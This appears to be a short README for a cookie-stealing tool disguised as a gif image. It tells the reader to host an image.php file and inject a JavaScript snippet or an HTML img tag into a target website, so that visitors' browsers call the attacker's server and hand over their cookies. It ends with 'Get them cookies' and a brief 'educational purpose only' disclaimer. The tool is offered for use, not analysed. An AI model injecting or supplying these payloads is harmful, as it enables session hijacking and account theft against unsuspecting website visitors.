# Cookie Stealer

A cookie stealer disguised as a gif image.

## Hot to use

Host the *image.php* file wherever you want.

Inject the code on the target

```javascript
let img = new Image();
img.src = "http://yoursite.com/image.php";
document.body.appendChild(img);
```
or in plain html

```html
<img src="http://yoursite.com/image.php">
```

Get them cookies.

## Disclaimer

I'm not responsible for your actions. The code provided here is for educational purpose only. If you find a web site with code injection vulnerability, inform them.

I wrote this script some time ago, after watching this video:

[![Send cookies with image request](http://img.youtube.com/vi/KaEj_qZgiKY/0.jpg)](http://www.youtube.com/watch?v=KaEj_qZgiKY?t=167)
